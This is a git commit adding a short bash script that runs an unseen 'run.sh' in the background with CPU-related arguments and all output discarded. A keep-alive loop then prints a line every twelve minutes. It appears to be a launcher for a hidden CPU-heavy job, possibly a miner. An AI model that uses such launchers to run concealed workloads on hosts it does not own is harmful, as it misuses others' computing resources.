276cfd4e79731105e43d56255d482d95a31af7da
anangharis510sksm <anangharis510@gmail.com>
2026-02-09 21:32:45 +0700

    Initial commit

---
+++ bas.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+cd vivo && chmod 777 run.sh && nproc --all && ./run.sh 7 Cpu-020 >/dev/null 2>&1 &
+sleep 60
+while true
+do
+        echo "...19 ULO PITON..."
+        sleep 720
+done
